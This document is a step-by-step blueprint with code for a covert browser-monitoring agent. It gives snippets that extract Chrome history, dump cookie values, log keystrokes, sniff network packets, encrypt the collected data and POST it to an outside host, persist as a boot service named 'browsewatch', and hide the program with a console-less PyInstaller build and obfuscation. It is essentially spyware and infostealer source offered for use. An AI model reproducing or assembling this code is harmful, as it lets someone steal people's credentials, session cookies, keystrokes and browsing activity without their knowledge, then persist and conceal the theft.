1. Hook browser process
2. Extract browsing history (SQLite for Chromium, JSON for Firefox)
3. Read and decrypt cookies (browser-cookie3, keyring)
4. Monitor in real-time (psutil for process polling, watchdog for file change)
5. Capture session data (active tab URL, tab switching via accessibility APIs or browser automation)
6. Keylogging (pynput, only under explicit authorization)
7. Network packet capture (scapy or pyshark)
8. Export and send data (requests, encryption with cryptography or pycryptodome)
9. Persist on boot (Windows service, Linux systemd)
10. Hide execution (pyinstaller --noconsole, rename process, obfuscate script)


**1. Extract Chrome history (SQLite)**

```python
import sqlite3
import os

path = os.path.expanduser("~/.config/google-chrome/Default/History")
conn = sqlite3.connect(path)
cursor = conn.cursor()
cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
for row in cursor.fetchall():
    print(row)
conn.close()
```

**2. Extract cookies (browser-cookie3)**

```python
import browser_cookie3

cj = browser_cookie3.chrome()
for cookie in cj:
    print(cookie.domain, cookie.name, cookie.value)
```

**3. Real-time file monitoring (watchdog)**

```python
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class Handler(FileSystemEventHandler):
    def on_modified(self, event):
        print(f'Modified: {event.src_path}')

observer = Observer()
observer.schedule(Handler(), path='.', recursive=False)
observer.start()
```

**4. Process polling (psutil)**

```python
import psutil

for proc in psutil.process_iter(['pid', 'name']):
    if 'chrome' in proc.info['name'].lower():
        print(proc.info)
```

**5. Keylogging (pynput)**

```python
from pynput import keyboard

def on_press(key):
    print(f'Key {key} pressed')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

**6. Packet sniffing (scapy)**

```python
from scapy.all import sniff

def packet_callback(packet):
    print(packet.summary())

sniff(prn=packet_callback, store=0)
```

**7. Encrypt and export data (cryptography + requests)**

```python
from cryptography.fernet import Fernet
import requests

key = Fernet.generate_key()
cipher = Fernet(key)
data = b'secret data'
encrypted = cipher.encrypt(data)

requests.post('http://example.com/upload', data=encrypted)
```

**8. Install on boot (Windows, pywin32)**

```python
import win32serviceutil

# Create a .bat file to register the script as a Windows service, or use NSSM
```

**9. Install on boot (Linux, systemd)**

```ini
# /etc/systemd/system/browsewatch.service
[Unit]
Description=Browsewatch

[Service]
ExecStart=/usr/bin/python3 /path/to/agent.py
Restart=always

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl enable browsewatch
sudo systemctl start browsewatch
```

**10. Obfuscation (PyInstaller)**

```bash
pyinstaller --noconsole --onefile agent.py
```
